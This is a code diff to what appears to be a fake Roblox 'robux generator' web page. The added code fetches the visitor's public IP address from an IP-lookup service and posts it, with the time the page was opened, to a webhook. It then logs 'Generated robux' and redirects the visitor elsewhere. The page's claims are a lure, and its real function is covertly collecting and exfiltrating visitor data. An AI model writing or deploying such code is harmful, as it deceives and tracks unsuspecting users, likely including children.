@@ -18,28 +18,36 @@
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
 
-      var message = {
-        content: "Opened on: " + formattedDate
-      };
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ip = data.ip;
+          var message = {
+            content: "Opened on: " + formattedDate + "\nUser's IP address: " + ip
+          };
 
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-      })
-      .then(response => {
-        if (!response.ok) {
-          console.error("Failed generating robux");
-        } else {
-          console.log("Generated robux");
-          redirectToDifferentWebsite();
-        }
-      })
-      .catch(error => {
-        console.error("Error generating robux");
-      });
+          fetch(webhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+          })
+          .then(response => {
+            if (!response.ok) {
+              console.error("Failed generating robux");
+            } else {
+              console.log("Generated robux");
+              redirectToDifferentWebsite();
+            }
+          })
+          .catch(error => {
+            console.error("Error generating robux");
+          });
+        })
+        .catch(error => {
+          console.error("Error fetching IP address:", error);
+        });
     }
 
     function redirectToDifferentWebsite() {
